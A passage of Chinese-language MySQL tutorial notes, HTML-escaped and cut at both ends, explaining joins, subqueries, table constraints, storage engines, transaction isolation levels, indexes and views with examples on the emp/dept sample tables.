–&gt; select –&gt; order by\n\n从某张表中查询数据，\n先经过where条件筛选出有价值的数据。\n对这些有价值的数据进行分组。\n分组之后可以使用having继续筛选。\nselect查询出来。\n最后排序输出！\n\n找出每个岗位的平均薪资，要求显示平均薪资大于1500的，除MANAGER岗位之外，\n要求按照平均薪资降序排。\n\tselect \n\t\tjob, avg(sal) as avgsal\n\tfrom\n\t\temp\n\twhere\n\t\tjob &lt;&gt; &#39;MANAGER&#39;\n\tgroup by\n\t\tjob\n\thaving\n\t\tavg(sal) &gt; 1500\n\torder by\n\t\tavgsal desc;\n\n6.连表查询\n从一张表中单独查询，称为单表查询\n\nemp表和dept表联合起来查询数据，从emp表中取员工名字，从dept表中取部门名字。\n\n这种跨表查询，多张表联合起来查询数据，被称为连接查询。\n\n\nselect ename,dname from emp, dept;\n\n当两张表进行连接查询，没有任何条件限制的时候，最终查询结果条数，是两张表条数的乘积，这种现象被称为：笛卡尔积现象。\n\n6.1内连接之等值连接查询每个员工所在部门名称，显示员工名和部门名？\n\nemp e和dept d表进行连接。条件是：e.deptno &#x3D; d.deptno\n\nSQL92语法：\n\tselect \n\t\te.ename,d.dname\n\tfrom\n\t\temp e, dept d\n\twhere\n\t\te.deptno &#x3D; d.deptno;\n\t\n\tsql92的缺点：结构不清晰，表的连接条件，和后期进一步筛选的条件，都放到了where后面。\n\t\nSQL99语法：\n\t&#x2F;&#x2F;inner可以省略（带着inner可读性更好！！！一眼就能看出来是内连接）\n\tselect \n\t\te.ename,d.dname\n\tfrom\n\t\temp e\n\tinner join\n\t\tdept d\n\ton\n\t\te.deptno &#x3D; d.deptno; &#x2F;&#x2F; 条件是等量关系，所以被称为等值连接。\n\tsql99优点：表连接的条件是独立的，连接之后，如果还需要进一步筛选，再往后继续添加where\n\n6.2内连接之非等值连接找出每个员工的薪资等级，要求显示员工名、薪资、薪资等级？\nselect \n\te.ename, e.sal, s.grade\nfrom\n\temp e\njoin\n\tsalgrade s\non\n\te.sal between s.losal and s.hisal; &#x2F;&#x2F; 条件不是一个等量关系，称为非等值连接。\n\n6.3内连接自己连接查询员工的上级领导，要求显示员工名和对应的领导名？\n技巧：一张表看成两张表。\nselect \n\ta.ename as &#39;员工名&#39;, b.ename as &#39;领导名&#39;\nfrom\n\temp a\njoin\n\temp b\non\n\ta.mgr &#x3D; b.empno; &#x2F;&#x2F;员工的领导编号 &#x3D; 领导的员工编号\n\n6.4外连接\n内连接：（A和B连接，AB两张表没有主次关系。平等的。）\n\n内连接的特点：完成能够匹配上ON后面的条件的数据查询出来。\n\n\n&#x2F;&#x2F; outer是可以省略的，带着可读性强。\nselect \n\te.ename,d.dname\nfrom\n\temp e \nright outer join \n\tdept d\non\n\te.deptno &#x3D; d.deptno;\n\n\nright代表什么：表示将join关键字右边的这张表看成主表，主要是为了将\n这张表的数据全部查询出来，捎带着关联查询左边的表。\n在外连接当中，两张表连接，产生了主次关系。\n\nselect \n\te.ename,d.dname\nfrom\n\tdept d \nleft outer join \n\temp e\non\n\te.deptno &#x3D; d.deptno;\n\n带有right的是右外连接，又叫做右连接。\n带有left的是左外连接，又叫做左连接。\n任何一个右连接都有左连接的写法。\n任何一个左连接都有右连接的写法。\n\n6.5多表连接三张表，四张表怎么连接？\n语法：\n\tselect \n\t\t...\n\tfrom\n\t\ta\n\tjoin\n\t\tb\n\ton\n\t\ta和b的连接条件\n\tjoin\n\t\tc\n\ton\n\t\ta和c的连接条件\n\tright join\n\t\td\n\ton\n\t\ta和d的连接条件\n\n找出每个员工的部门名称以及工资等级，要求显示员工名、部门名、薪资、薪资等级？\nselect \n\t\te.ename,e.sal,d.dname,s.grade\n\tfrom\n\t\temp e\n\tjoin\n\t\tdept d\n\ton \n\t\te.deptno &#x3D; d.deptno\n\tjoin\n\t\tsalgrade s\n\ton\n\t\te.sal between s.losal and s.hisal;\n\n找出每个员工的部门名称以及工资等级，还有上级领导，要求显示员工名、领导名、部门名、薪资、薪资等级？\nselect \n\te.ename,e.sal,d.dname,s.grade,l.ename\nfrom\n\temp e\njoin\n\tdept d\non \n\te.deptno &#x3D; d.deptno\njoin\n\tsalgrade s\non\n\te.sal between s.losal and s.hisal\nleft join\n\temp l\non\n\te.mgr &#x3D; l.empno;\n\n7.子查询\nselect语句中嵌套select语句，被嵌套的select语句称为子查询。\n\n子查询可以出现在 select后面，from 后面，where 后面。\n\n\n7.1where子句中的子查询找出比最低工资高的员工姓名和工资？\n\nselect ename,sal from emp where sal &gt; (select min(sal) from emp);\n\n7.2from子句中的子查询\nfrom后面的子查询，可以将子查询的查询结果当做一张临时表。（技巧）\n\n找出每个岗位的平均工资的薪资等级。\nselect \n\t\t\tt.*, s.grade\n\t\tfrom\n\t\t\t(select job,avg(sal) as avgsal from emp group by job) t\n\t\tjoin\n\t\t\tsalgrade s\n\t\ton\n\t\t\tt.avgsal between s.losal and s.hisal;\n\n8.约束\n在创建表的时候，我们可以给表中的字段加上一些约束，来保证这个表中数据的完整性、有效性！！！\n\n8.1约束类型\n非空约束：not null\n唯一性约束: unique\n主键约束: primary key （简称PK）\n外键约束：foreign key（简称FK）\n检查约束：check（mysql不支持，oracle支持）\n\n我们这里重点学习四个约束：not null，unique，primary key，foreign key。\n8.2not null\n非空约束not null约束的字段不能为NULL。\n\ndrop table if exists t_vip;\n\tcreate table t_vip(\n\t\tid int,\n\t\tname varchar(255) not null  &#x2F;&#x2F; not null只有列级约束，没有表级约束！\n\t);\ninsert into t_vip(id,name) values(1,&#39;zhangsan&#39;);\n\ninsert into t_vip(id) values(3);\n\tERROR 1364 (HY000): Field &#39;name&#39; doesn&#39;t have a default value\n\n\n\n8.3unique\n唯一性约束unique约束的字段不能重复，但是可以为NULL。\n\ndrop table if exists t_vip;\ncreate table t_vip(\n\tid int,\n\tname varchar(255) unique,\n\temail varchar(255)\n);\ninsert into t_vip(id,name,email) values(2,&#39;lisi&#39;,&#39;lisi@123.com&#39;);\ninsert into t_vip(id,name,email) values(3,&#39;wangwu&#39;,&#39;wangwu@123.com&#39;);\nselect * from t_vip;\n\ninsert into t_vip(id,name,email) values(4,&#39;wangwu&#39;,&#39;wangwu@sina.com&#39;);\nERROR 1062 (23000): Duplicate entry &#39;wangwu&#39; for key &#39;name&#39;\n\ninsert into t_vip(id) values(4);\ninsert into t_vip(id) values(5);\n+------+----------+------------------+\n| id   | name     | email            |\n+------+----------+------------------+\n|    1 | zhangsan | zhangsan@123.com |\n|    2 | lisi     | lisi@123.com     |\n|    3 | wangwu   | wangwu@123.com   |\n|    4 | NULL     | NULL             |\n|    5 | NULL     | NULL             |\n+------+----------+------------------+\nname字段虽然被unique约束了，但是可以为NULL。\n\n8.3.1联合唯一\nname和email两个字段联合起来具有唯一性！！！！\n\ndrop table if exists t_vip;\ncreate table t_vip(\n\tid int,\n\tname varchar(255),\n\temail varchar(255),\n\tunique(name,email) &#x2F;&#x2F; 约束没有添加在列的后面，这种约束被称为表级约束。\n);\ninsert into t_vip(id,name,email) values(1,&#39;zhangsan&#39;,&#39;zhangsan@123.com&#39;);\ninsert into t_vip(id,name,email) values(2,&#39;zhangsan&#39;,&#39;zhangsan@sina.com&#39;);\n\tname和email两个字段联合起来唯一！！！\n\t\ninsert into t_vip(id,name,email) values(3,&#39;zhangsan&#39;,&#39;zhangsan@sina.com&#39;);\n\tERROR 1062 (23000): Duplicate entry &#39;zhangsan-zhangsan@sina.com&#39; for key &#39;name&#39;\n\n\n在mysql当中，如果一个字段同时被not null和unique约束的话，该字段自动变成主键字段。（注意：oracle中不一样！）\n\n8.4primary key\n主键值是每一行记录的唯一标识。主键值是每一行记录的身份证号！！！\n\n主键的特征：not null + unique（主键值不能是NULL，同时也不能重复！）\n\n\ndrop table if exists t_vip;\n\t\t&#x2F;&#x2F; 1个字段做主键，叫做：单一主键\n\t\tcreate table t_vip(\n\t\t\tid int primary key,  &#x2F;&#x2F;列级约束\n\t\t\tname varchar(255),\n            primary key(id)  &#x2F;&#x2F; 表级约束\n\t\t);\n\t\tinsert into t_vip(id,name) values(1,&#39;zhangsan&#39;);\n\t\tinsert into t_vip(id,name) values(2,&#39;lisi&#39;);\n\n\t\t&#x2F;&#x2F;错误：不能重复\n\t\tinsert into t_vip(id,name) values(2,&#39;wangwu&#39;);\n\t\tERROR 1062 (23000): Duplicate entry &#39;2&#39; for key &#39;PRIMARY&#39;\n\n\t\t&#x2F;&#x2F;错误：不能为NULL\n\t\tinsert into t_vip(name) values(&#39;zhaoliu&#39;);\n\t\tERROR 1364 (HY000): Field &#39;id&#39; doesn&#39;t have a default value\n\n8.4.1复合主键drop table if exists t_vip;\n\t\t&#x2F;&#x2F; id和name联合起来做主键：复合主键！！！！\n\t\tcreate table t_vip(\n\t\t\tid int,\n\t\t\tname varchar(255),\n\t\t\temail varchar(255),\n\t\t\tprimary key(id,name)\n\t\t);\ninsert into t_vip(id,name,email) values(1,&#39;zhangsan&#39;,&#39;zhangsan@123.com&#39;);\ninsert into t_vip(id,name,email) values(1,&#39;lisi&#39;,&#39;lisi@123.com&#39;);\n\n&#x2F;&#x2F;错误：不能重复\ninsert into t_vip(id,name,email) values(1,&#39;lisi&#39;,&#39;lisi@123.com&#39;);\n\tERROR 1062 (23000): Duplicate entry &#39;1-lisi&#39; for key &#39;PRIMARY&#39;\n\n\n在实际开发中不建议使用：复合主键。建议使用单一主键！\n因为主键值存在的意义就是这行记录的身份证号，只要意义达到即可，单一主键可以做到。\n\n一个表中主键约束能加两个吗？\n\t\tdrop table if exists t_vip;\n\t\tcreate table t_vip(\n\t\t\tid int primary key,\n\t\t\tname varchar(255) primary key\n\t\t);\n\t\tERROR 1068 (42000): Multiple primary key defined\n\n\n结论：一张表，主键约束只能添加1个。（主键只能有1个。）\n\n主键分类\n\n自然主键：主键值是一个自然数，和业务没关系。\n\n业务主键：主键值和业务紧密关联，例如拿银行卡账号做主键值。这就是业务主键！\n\n\n8.4.2主键自增\n在mysql当中，有一种机制，可以帮助我们自动维护一个主键值\n\nrop table if exists t_vip;\ncreate table t_vip(\n\tid int primary key auto_increment, &#x2F;&#x2F;auto_increment表示自增，从1开始，以1递增！\n\tname varchar(255)\n);\n\t\tinsert into t_vip(name) values(&#39;zhangsan&#39;);\n\t\tinsert into t_vip(name) values(&#39;zhangsan&#39;);\n\t\tinsert into t_vip(name) values(&#39;zhangsan&#39;);\n\t\tinsert into t_vip(name) values(&#39;zhangsan&#39;);\n\t\tinsert into t_vip(name) values(&#39;zhangsan&#39;);\n\t\tinsert into t_vip(name) values(&#39;zhangsan&#39;);\n\t\t\n\t\t+----+----------+\n\t\t| id | name     |\n\t\t+----+----------+\n\t\t|  1 | zhangsan |\n\t\t|  2 | zhangsan |\n\t\t|  3 | zhangsan |\n\t\t|  4 | zhangsan |\n\t\t|  5 | zhangsan |\n\n8.5foreign key\n如果一个实体的某个字段指向另一个实体的主键，就称为外键\n被指向的实体，称之为主实体（主表），也叫父实体（父表）。\n负责指向的实体，称之为从实体（从表），也叫子实体（子表）\n\ncreate table t_class(\n\tclassno int primary key,\n\tclassname varchar(255)\n);\ncreate table t_student(\n\tno int primary key auto_increment,\n\tname varchar(255),\n\tcno int,\n\tforeign key(cno) references t_class(classno)\n);\n\ninsert into t_class(classno, classname) values(100, &#39;北京市大兴区亦庄镇第二中学高三1班&#39;);\ninsert into t_class(classno, classname) values(101, &#39;北京市大兴区亦庄镇第二中学高三1班&#39;);\n\ninsert into t_student(name,cno) values(&#39;jack&#39;, 100);\ninsert into t_student(name,cno) values(&#39;lilei&#39;, 100);\ninsert into t_student(name,cno) values(&#39;hanmeimei&#39;, 100);\ninsert into t_student(name,cno) values(&#39;zhangsan&#39;, 101);\ninsert into t_student(name,cno) values(&#39;lisi&#39;, 101);\n\n\n外键可以为空，可以理解成 一名学生肯定会关联到一个存在的班级，但来了一个转校生，还没有分班，他现在属于学生子表，但还没有关联到班级主表中的任何一条记录。\n\nt_class是父表，t_student是子表\n​\t\t删除表的顺序？\t先删子，再删父。\n​\t\t创建表的顺序？\t先创建父，再创建子。\n​\t\t删除数据的顺序？先删子，再删父。\n​\t\t插入数据的顺序？先插入父，再插入子\n\n子表中的外键引用的父表中的某个字段，被引用的这个字段不一定是主键，但至少具有unique约束。\n\n9.存储引擎\n存储引擎是MySQL中特有的一个术语，其它数据库中没有。（Oracle中有，但是不叫这个名字）\n实际上存储引擎是一个表存储&#x2F;组织数据的方式。\n不同的存储引擎，表存储数据的方式不同。\n\nshow create table t_student;\n可以在建表的时候给表指定存储引擎。\nCREATE TABLE &#96;t_student&#96; (\n  &#96;no&#96; int(11) NOT NULL AUTO_INCREMENT,\n  &#96;name&#96; varchar(255) DEFAULT NULL,\n  &#96;cno&#96; int(11) DEFAULT NULL,\n  PRIMARY KEY (&#96;no&#96;),\n  KEY &#96;cno&#96; (&#96;cno&#96;),\n  CONSTRAINT &#96;t_student_ibfk_1&#96; FOREIGN KEY (&#96;cno&#96;) REFERENCES &#96;t_class&#96; (&#96;classno&#96;)\n) ENGINE&#x3D;InnoDB AUTO_INCREMENT&#x3D;11 DEFAULT CHARSET&#x3D;utf8\n\n在建表的时候可以在最后小括号的”)”的右边使用：\n\nENGINE来指定存储引擎。\tmysql默认的存储引擎是：InnoDB\nCHARSET来指定这张表的字符编码方式。mysql默认的字符编码方式是：utf8\n\n9.1mysql支持的存储引擎\nshow engines \\G   查看mysql支持哪些存储引擎\nmysql支持九大存储引擎，当前5.5.36支持8个。版本不同支持情况不同。\n\n\n9.2MyISAM存储引擎\n使用三个文件表示每个表：\n\n格式文件 — 存储表结构的定义（mytable.frm）\n数据文件 — 存储表行的内容（mytable.MYD）\n索引文件 — 存储表上索引（mytable.MYI）：索引是一本书的目录，缩小扫描范围，提高查询效率的一种机制。\n\n\n可被转换为压缩、只读表来节省空间\n\nMyISAM存储引擎特点：\n\n可被转换为压缩、只读表来节省空间这是这种存储引擎的优势！！！！\nMyISAM不支持事务机制，安全性低。\n\n\n\n9.3InnoDB存储引擎\n这是mysql默认的存储引擎，同时也是一个重量级的存储引擎。\n\nInnoDB支持事务，支持数据库崩溃后自动恢复机制。\n\nInnoDB存储引擎最主要的特点是：非常安全。\n\n它管理的表具有下列主要特征：\n\n每个 InnoDB 表在数据库目录中以.frm 格式文件表示\nInnoDB 表空间 tablespace 被用于存储表的内容（表空间是一个逻辑名称。表空间存储数据+索引。）\n提供一组用来记录事务性活动的日志文件\n用 COMMIT(提交)、SAVEPOINT 及ROLLBACK(回滚)支持事务处理\n提供全 ACID 兼容\n在 MySQL 服务器崩溃后提供自动恢复\n多版本（MVCC）和行级锁定\n支持外键及引用的完整性，包括级联删除和更新\n\n\nInnoDB最大的特点就是支持事务：以保证数据的安全。效率不是很高，并且也不能压缩，不能转换为只读，\n\n不能很好的节省存储空间。\n\n\n9.4MEMORY存储引擎\n使用 MEMORY 存储引擎的表，其数据存储在内存中，且行的长度固定，这两个特点使得 MEMORY 存储引擎非常快。\n\nMEMORY 存储引擎管理的表具有下列特征：\n\n在数据库目录内，每个表均以.frm 格式的文件表示。\n表数据及索引被存储在内存中。（目的就是快，查询快！）\n表级锁机制。\n不能包含 TEXT 或 BLOB 字段。\n\n\nMEMORY 存储引擎以前被称为HEAP 引擎。\n\nMEMORY引擎优点：查询效率是最高的。不需要和硬盘交互。\n\nMEMORY引擎缺点：不安全，关机之后数据消失。因为数据和索引都是在内存当中。\n\n\n10.事务\n一个事务其实就是一个完整的业务逻辑。是一个最小的工作单元。不可再分。\n\n什么是一个完整的业务逻辑？    假设转账，从A账户向B账户中转账10000.      将A账户的钱减去10000（update语句）      将B账户的钱加上10000（update语句）      这就是一个完整的业务逻辑。\n\n以上的操作是一个最小的工作单元，要么同时成功，要么同时失败，不可再分。这两个update语句要求必须同时成功或者同时失败，这样才能保证钱是正确的。\n\ninsert   delete   update  只有以上的三个语句和事务有关系，其它都没有关系。\n\n事务：就是批量的DML语句同时成功，或者同时失败！\n\n\n10.1InnoDB实现事务\nInnoDB存储引擎：提供一组用来记录事务性活动的日志文件\n\n在事务的执行过程中，每一条DML的操作都会记录到“事务性活动的日志文件”中。\n\n在事务的执行过程中，我们可以提交事务，也可以回滚事务。\n\n提交事务   commit; 语句\n\n清空事务性活动的日志文件，将数据全部彻底持久化到数据库表中。\n提交事务标志着，事务的结束。并且是一种全部成功的结束。\n\n\n回滚事务  rollback; 语句（回滚永远都是只能回滚到上一次的提交点！）\n\n将之前所有的DML操作全部撤销，并且清空事务性活动的日志文件\n回滚事务标志着，事务的结束。并且是一种全部失败的结束。\n\n\n将mysql的自动提交机制关闭掉   start transaction;\n\n\n事务回滚\n\tmysql&gt; select * from dept_bak;\n\t\tEmpty set (0.00 sec)\n\tmysql&gt; start transaction;\n\tQuery OK, 0 rows affected (0.00 sec)\n\n\tmysql&gt; insert into dept_bak values(10,&#39;abc&#39;, &#39;tj&#39;);\n\tQuery OK, 1 row affected (0.00 sec)\n\n\tmysql&gt; insert into dept_bak values(10,&#39;abc&#39;, &#39;tj&#39;);\n\tQuery OK, 1 row affected (0.00 sec)\n\n\tmysql&gt; select * from dept_bak;\n\t+--------+-------+------+\n\t| DEPTNO | DNAME | LOC  |\n\t+--------+-------+------+\n\t|     10 | abc   | tj   |\n\t|     10 | abc   | tj   |\n\t+--------+-------+------+\n\t2 rows in set (0.00 sec)\n\n\tmysql&gt; rollback;\n\tQuery OK, 0 rows affected (0.00 sec)\n\n\tmysql&gt; select * from dept_bak;\n\tEmpty set (0.00 sec)\n\n10.2事物的四个特性A：原子性        说明事务是最小的工作单元。不可再分。\nC：一致性    所有事务要求，在同一个事务当中，所有操作必须同时成功，或者同时失败，    以保证数据的一致性。\nI：隔离性    A事务和B事务之间具有一定的隔离。    教室A和教室B之间有一道墙，这道墙就是隔离性。    A事务在操作一张表的时候，另一个事务B也操作这张表会那样？？？\nD：持久性    事务最终结束的一个保障。事务提交，就相当于将没有保存到硬盘上的数据    保存到硬盘上！\n10.3事务的隔离性10.3.1事务和事务之间四个隔离级别读未提交：read uncommitted（最低的隔离级别）《没有提交就读到了》\n\n事务A可以读取到事务B未提交的数据。\n这种隔离级别存在的问题就是：脏读现象！(Dirty Read)我们称读到了脏数据。\n这种隔离级别一般都是理论上的，大多数的数据库隔离级别都是二档起步！\n\n读已提交：read committed《提交之后才能读到》\n\n事务A只能读取到事务B提交之后的数据。\n这种隔离级别解决了解决了脏读的现象。\n这种隔离级别不可重复读取数据。\n在事务开启之后，第一次读到的数据是3条，当前事务还没有结束，可能第二次再读取的时候，读到的数据是4条，3不等于4称为不可重复读取。\n\n\n这种隔离级别是比较真实的数据，每一次读到的数据是绝对的真实。\noracle数据库默认的隔离级别是：read committed\n\n可重复读：repeatable read《提交之后也读不到，永远读取的都是刚开启事务时的数据》\n\n事务A开启之后，不管是多久，每一次在事务A中读取到的数据都是一致的。即使事务B将数据已经修改，并且提交了，事务A读取到的数据还是没有发生改变，这就是可重复读。\n\n可重复读可能会出现幻影读。每一次读取到的数据都是幻象。不够真实！\n\n早晨9点开始开启了事务，只要事务不结束，到晚上9点，读到的数据还是那样！读到的是假象。不够绝对的真实。\n\nmysql中默认的事务隔离级别就是这个！！！！！！！！！！！\n\n\n序列化&#x2F;串行化：serializable（最高的隔离级别）\n\n这是最高隔离级别，效率最低。解决了所有的问题。\n这种隔离级别表示事务排队，不能并发！\nsynchronized，线程同步（事务同步）每一次读取到的数据都是最真实的，并且效率是最低的。\n\n10.3.2验证各种隔离级别\nmysql 5 查看隔离级别：SELECT @@tx_isolation\nmysql 8 查看隔离级别：select @@transaction_isolation;\n\n验证：read uncommited\nmysql&gt; set global transaction isolation level read uncommitted;\n事务A\t\t\t\t\t\t\t\t\t\t\t\t\t事务B\n--------------------------------------------------------------------------------\nuse bjpowernode;\n\t\t\t\t\t\t\t\t\t\t\t\t\tuse bjpowernode;\nstart transaction;\nselect * from t_user;\n\t\t\t\t\t\t\t\t\t\t\t\t\tstart transaction;\n\t\t\t\t\t\t\t\t\t\t\t\t\tinsert into t_user values(&#39;zhangsan&#39;);\nselect * from t_user;\n\n验证：read commited\nmysql&gt; set global transaction isolation level read committed;\n事务A\t\t\t\t\t\t\t\t\t\t\t\t\t事务B\n--------------------------------------------------------------------------------\nuse bjpowernode;\n\t\t\t\t\t\t\t\t\t\t\t\t\tuse bjpowernode;\nstart transaction;\n\t\t\t\t\t\t\t\t\t\t\t\t\tstart transaction;\nselect * from t_user;\n\t\t\t\t\t\t\t\t\t\t\t\t\tinsert into t_user values(&#39;zhangsan&#39;);\nselect * from t_user;\n\t\t\t\t\t\t\t\t\t\t\t\t\tcommit;\nselect * from t_user;\n\n验证：repeatable read\nmysql&gt; set global transaction isolation level repeatable read;\n事务A\t\t\t\t\t\t\t\t\t\t\t\t\t事务B\n--------------------------------------------------------------------------------\nuse bjpowernode;\n\t\t\t\t\t\t\t\t\t\t\t\t\tuse bjpowernode;\nstart transaction;\n\t\t\t\t\t\t\t\t\t\t\t\t\tstart transaction;\nselect * from t_user;\n\t\t\t\t\t\t\t\t\t\t\t\t\tinsert into t_user values(&#39;lisi&#39;);\n\t\t\t\t\t\t\t\t\t\t\t\t\tinsert into t_user values(&#39;wangwu&#39;);\n\t\t\t\t\t\t\t\t\t\t\t\t\tcommit;\nselect * from t_user;\n\n验证：serializable\nmysql&gt; set global transaction isolation level serializable;\n事务A\t\t\t\t\t\t\t\t\t\t\t\t\t事务B\n--------------------------------------------------------------------------------\nuse bjpowernode;\n\t\t\t\t\t\t\t\t\t\t\t\t\tuse bjpowernode;\nstart transaction;\n\t\t\t\t\t\t\t\t\t\t\t\t\tstart transaction;\nselect * from t_user;\ninsert into t_user values(&#39;abc&#39;);\n\n11.索引\n索引是在数据库表的字段上添加的，是为了提高查询效率存在的一种机制。\n\n一张表的一个字段可以添加一个索引，当然，多个字段联合起来也可以添加索引。\n\n索引相当于一本书的目录，是为了缩小扫描范围而存在的一种机制。\n\nMySQL在查询方面主要就是两种方式：全表扫描  ；根据索引检索。\n\n在mysql数据库当中索引也是需要排序的，并且这个所以的排序和TreeSet\n\n数据结构相同。TreeSet（TreeMap）底层是一个自平衡的二叉树！在mysql当中索引是一个B-Tree数据结构。\n\n遵循左小又大原则存放。采用中序遍历方式遍历取数据。\n\n\n索引的实现原理？\n\n\n提醒1：在任何数据库当中主键上都会自动添加索引对象，id字段上自动有索引，因为id是PK。另外在mysql当中，一个字段上如果有unique约束的话，也会自动创建索引对象\n提醒2：在任何数据库当中，任何一张表的任何一条记录在硬盘存储上都有一个硬盘的物理存储编号。\n提醒3：在mysql当中，索引是一个单独的对象，不同的存储引擎以不同的形式存在，在MyISAM存储引擎中，索引存储在一个.MYI文件中。在InnoDB存储引擎中索引存储在一个逻辑名称叫做tablespace的当中。在MEMORY存储引擎当中索引被存储在内存当中。不管索引存储在哪里，索引在mysql当中都是一个树的形式\n\n什么条件下，我们会考虑给字段添加索引呢？\n\n数据量庞大（到底有多么庞大算庞大，这个需要测试，因为每一个硬件环境不同）\n该字段经常出现在where的后面，以条件的形式存在，也就是说这个字段总是被扫描。\n该字段很少的DML(insert delete update)操作。（因为DML之后，索引需要重新排序。）\n\n\n建议不要随意添加索引，因为索引也是需要维护的，太多的话反而会降低系统的性能。\n建议通过主键查询，建议通过unique约束的字段进行查询，效率是比较高的。\n\n11.1索引的创建和删除创建索引：\n\tmysql&gt; create index emp_ename_index on emp(ename);\n\t给emp表的ename字段添加索引，起名：emp_ename_index\n删除索引：\n\tmysql&gt; drop index emp_ename_index on emp;\n\t将emp表上的emp_ename_index索引对象删除。\n\t\n\t\n\t查看一个SQL语句是否使用了索引进行检索？\n\tmysql&gt; explain select * from emp where ename &#x3D; &#39;KING&#39;;\n\t+----+-------------+-------+------+---------------+------+---------+--\n\t| id | select_type | table | type | possible_keys | key  | key_len | \n\t+----+-------------+-------+------+---------------+------+---------+-\n\t|  1 | SIMPLE      | emp   | ALL  | NULL          | NULL | NULL    | \n\t+----+-------------+-------+------+---------------+------+---------+--\n\t扫描14条记录：说明没有使用索引。type&#x3D;ALL\n\n\tmysql&gt; create index emp_ename_index on emp(ename);\n\n\tmysql&gt; explain select * from emp where ename &#x3D; &#39;KING&#39;;\n\t+----+-------------+-------+------+-----------------+-----------------\n\t| id | select_type | table | type | possible_keys   | key             \n\t+----+-------------+-------+------+-----------------+-----------------\n\t|  1 | SIMPLE      | emp   | ref  | emp_ename_index | emp_ename_index \n\t+----+-------------+-------+------+-----------------+-----------------\n\n11.2索引失效失效的第1种情况：\n\tselect * from emp where ename like &#39;%T&#39;;\n\tename上即使添加了索引，也不会走索引，为什么？\n\t\t原因是因为模糊匹配当中以“%”开头了！\n\t\t尽量避免模糊查询的时候以“%”开始。\n\t\t这是一种优化的手段&#x2F;策略。\n\tmyql&gt; explain select * from emp where ename like &#39;%T&#39;;\n\t+----+-------------+-------+------+---------------+------+---------+--\n\t| id | select_type | table | type | possible_keys | key  | key_len | \n\t+----+-------------+-------+------+---------------+------+---------+--\n\t|  1 | SIMPLE      | emp   | ALL  | NULL          | NULL | NULL    | \n\t+----+-------------+-------+------+---------------+------+---------+--\n\n失效的第2种情况：\n\t使用or的时候会失效，如果使用or那么要求or两边的条件字段都要有\n\t索引，才会走索引，如果其中一边有一个字段没有索引，那么另一个\n\t字段上的索引也会实现。所以这就是为什么不建议使用or的原因。\n\n\tmysql&gt; explain select * from emp where ename &#x3D; &#39;KING&#39; or job &#x3D; &#39;MANAGER&#39;;\n\t+----+-------------+-------+------+-----------------+------+---------\n\t| id | select_type | table | type | possible_keys   | key  | key_len | \n\t+----+-------------+-------+------+-----------------+------+---------\n\t|  1 | SIMPLE      | emp   | ALL  | emp_ename_index | NULL | NULL    | \n\t+----+-------------+-------+------+-----------------+------+---------\n\n失效的第3种情况：\n\t使用复合索引的时候，没有使用左侧的列查找，索引失效\n\t什么是复合索引？\n\t\t两个字段，或者更多的字段联合起来添加一个索引，叫做复合索引。\n\t\n\tcreate index emp_job_sal_index on emp(job,sal);\n\t\n\tmysql&gt; explain select * from emp where job &#x3D; &#39;MANAGER&#39;;\n\t+----+-------------+-------+------+-------------------+---------------\n\t| id | select_type | table | type | possible_keys     | key           \n\t+----+-------------+-------+------+-------------------+---------------\n\t|  1 | SIMPLE      | emp   | ref  | emp_job_sal_index | \n\t+----+-------------+-------+------+-------------------+---------------\n\t\n\tmysql&gt; explain select * from emp where sal &#x3D; 800;\n\t+----+-------------+-------+------+---------------+------+---------+--\n\t| id | select_type | table | type | possible_keys | key  | key_len | \n\t+----+-------------+-------+------+---------------+------+---------+--\n\t|  1 | SIMPLE      | emp   | ALL  | NULL          | NULL | NULL    | \n\t+----+-------------+-------+------+---------------+------+---------+--\n\n12.视图\n视图view:站在不同的角度去看待同一份数据。\n\n表复制：\n\tmysql&gt; create table dept2 as select * from dept;\ndept2表中的数据：\n\tmysql&gt; select * from dept2;\n+--------+------------+----------+\n| DEPTNO | DNAME      | LOC      |\n+--------+------------+----------+\n|     10 | ACCOUNTING | NEW YORK |\n|     20 | RESEARCH   | DALLAS   |\n|     30 | SALES      | CHICAGO  |\n|     40 | OPERATIONS | BOSTON   |\n+--------+------------+----------+\n\n创建视图对象：\n\tcreate view dept2_view as select * from dept2;\n\n删除视图对象：\n\tdrop view dept2_view;\n\n注意：只有DQL语句才能以view的形式创建。\n\tcreate view view_name as 这里的语句必须是DQL语句;\n\n12.1视图的作用\n我们可以面向视图对象进行增删改查，对视图对象的增删改查，会导致原表被操作！（视图的特点：通过对视图的操作，会影响到原表数据。）\n\n&#x2F;&#x2F;面向视图查询\nselect * from dept2_view; \n\n&#x2F;&#x2F; 面向视图插入\ninsert into dept2_view(deptno,dname,loc) values(60,&#39;SALES&#39;, &#39;BEIJING&#39;);\n\n&#x2F;&#x2F; 查询原表数据\nmysql&gt; select * from dept2;\n+--------+------------+----------+\n| DEPTNO | DNAME      | LOC      |\n+--------+------------+----------+\n|     10 | ACCOUNTING | NEW YORK |\n|     20 | RESEARCH   | DALLAS   |\n|     30 | SALES      | CHICAGO  |\n|     40 | OPERATIONS | BOSTON   |\n|     60 | SALES      | BEIJING  |\n+--------+------------+----------+\n\n&#x2F;&#x2F; 面向视图删除\nmysql&gt; delete from dept2_view;\n\n&#x2F;&#x2F; 查询原表数据\nmysql&gt; select * from dept2;\nEmpty set (0.00 sec)\n&#x2F;&#x2F; 创建视图对象\ncreate view \n\temp_dept_view\nas\n\tselect \n\t\te.ename,e.sal,d.dname\n\tfrom\n\t\temp e\n\tjoin\n\t\tdept d\n\ton\n\t\te.deptno &#x3D; d.deptno;\n\n&#x2F;&#x2F; 查询视图对象\nmysql&gt; select * from emp_dept_view;\n+--------+---------+------------+\n| ename  | sal     | dname      |\n+--------+---------+------------+\n| CLARK  | 2450.00 | ACCOUNTING |\n| KING   | 5000.00 | ACCOUNTING |\n| MILLER | 1300.00 | ACCOUNTING |\n| SMITH  |  800.00 | RESEARCH   |\n| JONES  | 2975.00 | RESEARCH   |\n| SCOTT  | 3000.00 | RESEARCH   |\n| ADAMS  | 1100.00 | RESEARCH   |\n| FORD   | 3000.00 | RESEARCH   |\n| ALLEN  | 1600.00 | SALES      |\n| WARD   | 1250.00 | SALES      |\n| MARTIN | 1250.00 | SALES      |\n| BLAKE  | 2850.00 | SALES      |\n| TURNER | 1500.00 | SALES      |\n| JAMES  |  950.00 | SALES      |\n+--------+---------+------------+\n\n&#x2F;&#x2F; 面向视图更新\nupdate emp_dept_view set sal &#x3D; 1000 where dname &#x3D; &#39;ACCOUNTING&#39;;\n\n&#x2F;&#x2F; 原表数据被更新\nmysql&gt; select * from emp;\n+-------+--------+-----------+------+------------+---------+---------+----\n| EMPNO | ENAME  | JOB       | MGR  | HIREDATE   